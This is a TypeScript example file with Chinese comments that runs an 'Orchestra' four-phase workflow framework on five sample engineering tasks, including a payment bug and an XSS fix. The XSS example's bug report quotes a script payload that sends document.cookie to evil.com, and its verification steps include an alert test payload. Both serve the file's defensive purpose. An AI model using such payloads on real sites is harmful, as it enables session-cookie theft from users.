/**
 * Orchestra 实战示例
 * 
 * 展示如何在真实场景中使用四阶段工作流
 */

import { FourPhaseWorkflow, WorkflowResult } from './four-phase-workflow';
import { Scratchpad } from './core';

// ============================================================================
// 示例 1: 紧急 Bug 修复（电商支付失败）
// ============================================================================

/**
 * 场景：电商平台收到大量用户反馈支付失败
 * 目标：快速定位问题并修复
 */
export async function exampleEcommercePaymentBug() {
  console.log('╔═══════════════════════════════════════════════════════════╗');
  console.log('║ 示例 1: 电商支付 Bug 紧急修复                              ║');
  console.log('╚═══════════════════════════════════════════════════════════╝\n');

  const workflow = new FourPhaseWorkflow({
    name: '🛒 支付 Bug 修复',
    description: '修复用户支付时出现的 500 错误',
    maxWorkers: 4,  // 增加并发加速修复
    timeout: 45 * 60 * 1000  // 45 分钟
  });

  const context = {
    bugReport: `
【问题描述】用户反馈支付时出现 500 错误
【影响范围】约 30% 的支付请求失败
【错误日志】
  - Error: Payment gateway timeout at stripe.processPayment
  - Database connection pool exhausted
  - Redis cache miss rate > 80%
【复现步骤】
  1. 添加商品到购物车
  2. 进入结算页面
  3. 选择支付宝支付
  4. 点击"立即支付"
  5. 出现 500 错误页面
【期望行为】支付流程正常完成，显示订单成功页面
    `.trim(),
    
    codebasePath: '/src/ecommerce/payment',
    
    searchQueries: [
      'payment', 'stripe', 'checkout', 
      'database connection', 'redis cache',
      'transaction', 'order'
    ],
    
    errorLogs: `
[2024-01-15 14:23:45] ERROR PaymentGateway timeout after 30s
[2024-01-15 14:23:46] ERROR Database pool: 100/100 connections used
[2024-01-15 14:23:47] ERROR Redis cache miss: product_12345
[2024-01-15 14:24:01] ERROR Transaction rollback: order_67890
    `.trim(),
    
    testCommand: 'npm test -- payment integration',
    
    manualVerificationSteps: `
1. 创建测试订单（商品 ID: test_product_001）
2. 使用测试支付宝账号完成支付
3. 验证订单状态变为"已支付"
4. 验证库存扣减正确
5. 验证收到订单确认邮件
    `.trim()
  };

  const result = await workflow.execute(context);
  
  printDetailedReport(result);
  return result;
}

// ============================================================================
// 示例 2: 社交功能开发（用户动态 Feed 流）
// ============================================================================

/**
 * 场景：为社交平台实现用户动态 Feed 流功能
 * 目标：支持关注、点赞、评论、转发
 */
export async function exampleSocialFeedFeature() {
  console.log('╔═══════════════════════════════════════════════════════════╗');
  console.log('║ 示例 2: 社交 Feed 流功能开发                               ║');
  console.log('╚═══════════════════════════════════════════════════════════╝\n');

  const workflow = new FourPhaseWorkflow({
    name: '📱 社交 Feed 流功能',
    description: '实现用户动态 Feed 流，支持关注、互动',
    maxWorkers: 3,
    timeout: 60 * 60 * 1000  // 1 小时
  });

  const context = {
    featureRequest: `
【功能需求】实现用户动态 Feed 流系统
【核心功能】
  1. 关注机制：用户可以关注其他用户
  2. Feed 流展示：按时间线展示关注用户的动态
  3. 互动功能：点赞、评论、转发
  4. 推送通知：被点赞/评论/关注时收到通知
【技术要求】
  - 支持百万级用户
  - Feed 流加载时间 < 200ms
  - 支持分页和无限滚动
  - 实时推送新动态
【数据结构】
  - User: id, name, avatar, followers, following
  - Post: id, userId, content, images, likes, comments, shares
  - Feed: userId, postIds[], lastUpdated
    `.trim(),
    
    codebasePath: '/src/social',
    
    searchQueries: [
      'feed', 'timeline', 'follow',
      'like', 'comment', 'share',
      'notification', 'push'
    ],
    
    testCommand: 'npm test -- social feed',
    
    manualVerificationSteps: `
1. 创建两个测试用户（UserA, UserB）
2. UserA 关注 UserB
3. UserB 发布一条动态
4. 验证 UserA 的 Feed 流中出现该动态
5. UserA 点赞、评论该动态
6. 验证 UserB 收到通知
7. UserA 转发该动态
8. 验证转发正确显示
    `.trim()
  };

  const result = await workflow.execute(context);
  
  printDetailedReport(result);
  return result;
}

// ============================================================================
// 示例 3: 性能优化（API 响应时间优化）
// ============================================================================

/**
 * 场景：核心 API 响应时间过长，需要优化
 * 目标：将 P99 延迟从 2s 降低到 200ms
 */
export async function examplePerformanceOptimization() {
  console.log('╔═══════════════════════════════════════════════════════════╗');
  console.log('║ 示例 3: API 性能优化                                       ║');
  console.log('╚═══════════════════════════════════════════════════════════╝\n');

  const workflow = new FourPhaseWorkflow({
    name: '⚡ API 性能优化',
    description: '优化核心 API 响应时间',
    maxWorkers: 5,  // 多 Worker 并行分析
    timeout: 90 * 60 * 1000  // 1.5 小时
  });

  const context = {
    refactorGoal: `
【优化目标】将核心 API P99 延迟从 2s 降低到 200ms
【当前性能指标】
  - P50: 800ms
  - P90: 1500ms
  - P99: 2000ms
  - 错误率：0.5%
【待优化 API】
  - GET /api/v1/products (商品列表)
  - GET /api/v1/users/:id/profile (用户主页)
  - POST /api/v1/orders (创建订单)
【性能瓶颈初步分析】
  - 数据库查询未优化（N+1 问题）
  - 缺少缓存层
  - 同步 IO 阻塞
  - 大对象序列化耗时
【优化方向】
  - 添加 Redis 缓存
  - 数据库索引优化
  - 异步处理非关键路径
  - 响应数据压缩
    `.trim(),
    
    codebasePath: '/src/api',
    
    searchQueries: [
      'database query', 'redis cache',
      'serialization', 'async',
      'indexing', 'pagination'
    ],
    
    testCommand: 'npm run benchmark',
    
    manualVerificationSteps: `
1. 使用 ab/wrk 进行压力测试
2. 验证 P99 延迟 < 200ms
3. 验证错误率 < 0.1%
4. 验证缓存命中率 > 90%
5. 验证数据库查询时间 < 50ms
    `.trim()
  };

  const result = await workflow.execute(context);
  
  printDetailedReport(result);
  return result;
}

// ============================================================================
// 示例 4: 安全漏洞修复（XSS 防护）
// ============================================================================

/**
 * 场景：安全扫描发现 XSS 漏洞
 * 目标：修复所有 XSS 漏洞点，加强输入验证
 */
export async function exampleSecurityXSSFix() {
  console.log('╔═══════════════════════════════════════════════════════════╗');
  console.log('║ 示例 4: XSS 安全漏洞修复                                   ║');
  console.log('╚═══════════════════════════════════════════════════════════╝\n');

  const workflow = new FourPhaseWorkflow({
    name: '🔒 XSS 漏洞修复',
    description: '修复安全扫描发现的 XSS 漏洞',
    maxWorkers: 3,
    timeout: 45 * 60 * 1000
  });

  const context = {
    bugReport: `
【安全漏洞】XSS（跨站脚本攻击）
【严重级别】高危
【影响范围】用户评论、个人简介、商品描述
【漏洞详情】
  1. 用户评论未过滤 HTML 标签
  2. 个人简介可直接插入<script>
  3. 商品描述富文本编辑器配置不当
【攻击示例】
  <script>document.location='http://evil.com/steal?c='+document.cookie</script>
【修复要求】
  - 所有用户输入进行 HTML 实体编码
  - 使用 CSP（内容安全策略）
  - 富文本使用白名单过滤
  - 添加 HttpOnly Cookie 标志
    `.trim(),
    
    codebasePath: '/src/security',
    
    searchQueries: [
      'xss', 'sanitize', 'escape',
      'html encode', 'csp',
      'dompurify', 'input validation'
    ],
    
    testCommand: 'npm test -- security',
    
    manualVerificationSteps: `
1. 在评论中输入<script>alert('xss')</script>
2. 验证脚本不被执行，显示为纯文本
3. 在个人简介中插入恶意链接
4. 验证链接被正确转义
5. 使用 OWASP ZAP 重新扫描
6. 验证所有高危漏洞已修复
    `.trim()
  };

  const result = await workflow.execute(context);
  
  printDetailedReport(result);
  return result;
}

// ============================================================================
// 示例 5: 数据迁移（数据库重构）
// ============================================================================

/**
 * 场景：数据库 schema 重构，需要迁移历史数据
 * 目标：零停机完成数据迁移
 */
export async function exampleDatabaseMigration() {
  console.log('╔═══════════════════════════════════════════════════════════╗');
  console.log('║ 示例 5: 数据库迁移（零停机）                               ║');
  console.log('╚═══════════════════════════════════════════════════════════╝\n');

  const workflow = new FourPhaseWorkflow({
    name: '🗄️ 数据库迁移',
    description: '用户表重构与数据迁移',
    maxWorkers: 4,
    timeout: 120 * 60 * 1000  // 2 小时
  });

  const context = {
    refactorGoal: `
【迁移目标】重构用户表结构，支持多账号体系
【原 Schema】
  users: id, name, email, password_hash, created_at
【新 Schema】
  users: id, primary_email, created_at
  user_accounts: id, user_id, email, password_hash, type
  user_profiles: id, user_id, name, avatar, bio
【迁移要求】
  - 零停机迁移（业务不中断）
  - 数据一致性保证
  - 可回滚方案
  - 迁移进度可监控
【迁移步骤】
  1. 创建新表结构
  2. 双写（同时写入新旧表）
  3. 历史数据迁移
  4. 数据校验
  5. 切换读流量
  6. 停止双写
  7. 清理旧表
    `.trim(),
    
    codebasePath: '/src/database',
    
    searchQueries: [
      'migration', 'schema',
      'user table', 'data transfer',
      'rollback', 'consistency check'
    ],
    
    testCommand: 'npm test -- database migration',
    
    manualVerificationSteps: `
1. 创建测试用户（旧表）
2. 执行迁移脚本
3. 验证新表数据正确
4. 验证用户可正常登录
5. 验证用户信息可正常修改
6. 执行回滚测试
7. 验证回滚后数据完整
    `.trim()
  };

  const result = await workflow.execute(context);
  
  printDetailedReport(result);
  return result;
}

// ============================================================================
// 辅助函数
// ============================================================================

/**
 * 打印详细报告
 */
function printDetailedReport(result: WorkflowResult) {
  console.log('\n' + '═'.repeat(60));
  console.log('📊 执行报告');
  console.log('═'.repeat(60));
  
  console.log(`\n${result.summary}`);
  
  // 详细阶段信息
  if (result.phases.research) {
    console.log('\n📋 研究阶段详情:');
    console.log(`   分析文件：${result.phases.research.filesAnalyzed.length}`);
    console.log(`   关键发现：${result.phases.research.findings.length}`);
    if (result.phases.research.findings.length > 0) {
      result.phases.research.findings.slice(0, 3).forEach(f => {
        console.log(`     • ${f.substring(0, 60)}${f.length > 60 ? '...' : ''}`);
      });
    }
    console.log(`   识别问题：${result.phases.research.issues.length}`);
  }
  
  if (result.phases.synthesis) {
    console.log('\n🧠 综合阶段详情:');
    console.log(`   问题陈述：${result.phases.synthesis.problemStatement.substring(0, 80)}...`);
    console.log(`   修改文件：${result.phases.synthesis.affectedFiles.length}`);
    if (result.phases.synthesis.affectedFiles.length > 0) {
      result.phases.synthesis.affectedFiles.slice(0, 5).forEach(f => {
        console.log(`     • ${f}`);
      });
    }
  }
  
  if (result.phases.implementation) {
    console.log('\n🔧 实现阶段详情:');
    console.log(`   已修改文件：${result.phases.implementation.filesModified.length}`);
    result.phases.implementation.filesModified.forEach(f => {
      console.log(`     ✓ ${f}`);
    });
  }
  
  if (result.phases.verification) {
    console.log('\n✅ 验证阶段详情:');
    console.log(`   测试总数：${result.phases.verification.testsRun}`);
    console.log(`   通过：${result.phases.verification.testsPassed} ✓`);
    console.log(`   失败：${result.phases.verification.testsFailed} ✗`);
    if (result.phases.verification.verificationReport) {
      console.log(`   报告摘要：${result.phases.verification.verificationReport.substring(0, 100)}...`);
    }
  }
  
  console.log('\n' + '═'.repeat(60));
  console.log(`最终状态：${result.success ? '✅ 成功' : '⚠️ 部分成功'}`);
  console.log('═'.repeat(60) + '\n');
}

// ============================================================================
// 运行所有示例
// ============================================================================

/**
 * 运行所有示例（用于演示和测试）
 */
export async function runAllExamples() {
  console.log('\n' + '🎻'.repeat(30));
  console.log('Orchestra 四阶段工作流 - 实战示例集');
  console.log('🎻'.repeat(30) + '\n');
  
  const examples = [
    { name: '电商支付 Bug 修复', fn: exampleEcommercePaymentBug },
    { name: '社交 Feed 流功能', fn: exampleSocialFeedFeature },
    { name: 'API 性能优化', fn: examplePerformanceOptimization },
    { name: 'XSS 安全漏洞修复', fn: exampleSecurityXSSFix },
    { name: '数据库迁移', fn: exampleDatabaseMigration }
  ];
  
  const results: Array<{ name: string; success: boolean }> = [];
  
  for (const example of examples) {
    try {
      console.log(`\n▶️  运行示例：${example.name}\n`);
      const result = await example.fn();
      results.push({ name: example.name, success: result.success });
    } catch (error) {
      console.error(`❌ 示例失败：${example.name}`, error);
      results.push({ name: example.name, success: false });
    }
  }
  
  // 汇总报告
  console.log('\n' + '🏁'.repeat(30));
  console.log('示例执行汇总');
  console.log('🏁'.repeat(30));
  
  results.forEach(r => {
    const icon = r.success ? '✅' : '⚠️';
    console.log(`${icon} ${r.name}: ${r.success ? '成功' : '部分成功'}`);
  });
  
  const successCount = results.filter(r => r.success).length;
  console.log(`\n总计：${successCount}/${results.length} 成功`);
}

// ============================================================================
// 导出
// ============================================================================

export {
  exampleEcommercePaymentBug,
  exampleSocialFeedFeature,
  examplePerformanceOptimization,
  exampleSecurityXSSFix,
  exampleDatabaseMigration
};
